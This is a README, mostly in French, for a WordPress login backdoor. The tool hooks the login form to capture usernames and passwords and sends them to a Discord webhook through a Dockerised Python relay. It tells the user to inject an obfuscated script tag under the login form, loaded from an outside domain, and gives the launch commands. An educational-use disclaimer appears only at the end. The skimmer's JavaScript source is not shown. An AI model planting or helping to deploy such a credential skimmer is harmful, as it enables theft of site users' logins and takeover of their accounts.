# WP-Login-Backdoor

## 📝 Description

Projet de backdoor simple de page de login wordpress:

- Hook le form de login wordpress pour récupérer les identifiants de connexion avant l'envoi de la requête de connexion
- Envoie les identifiants sur un server discord via un webhook discord

Contient :

- La backdoor javascript `wp-login_backdoor.js` et la backdoor obfusquée `wp-custom-util.js` à insérer sur la page wordpress en dessous du form `<form name="loginform" id="loginform"` comme : `<script src="https://domain/wp-custom-util.js"></script>`
- Le serveur python dockerisé pour envoyer les notifications discord

## 🚀 Quick Start

### Prerequisites

- Docker
- Docker Compose

### Installation & Launch

#### 1. Clone the repository

```bash
git clone https://github.com/votre-username/python-backdoor-lab.git
cd python-backdoor-lab
```

#### 2. Configure environment

Éditez le fichier .env ou modifiez les variables dans le docker-compose.yml pour ajouter votre webhook Discord

#### 3. Build & Run

```bash
docker-compose up -d --build
```

## ⚙️ Configuration

| Variable  | Description | Default |
| ------------- | ------------- | ------------- |
| WEBHOOK_HOST | Webhook du serveur discord | None |

---
⚠️ Educational Purpose Only
Disclaimer: This project is created for educational and ethical security testing purposes only. Using this software against target systems without prior legal authorization is illegal. The author is not responsible for any misuse or damage caused by this tool.
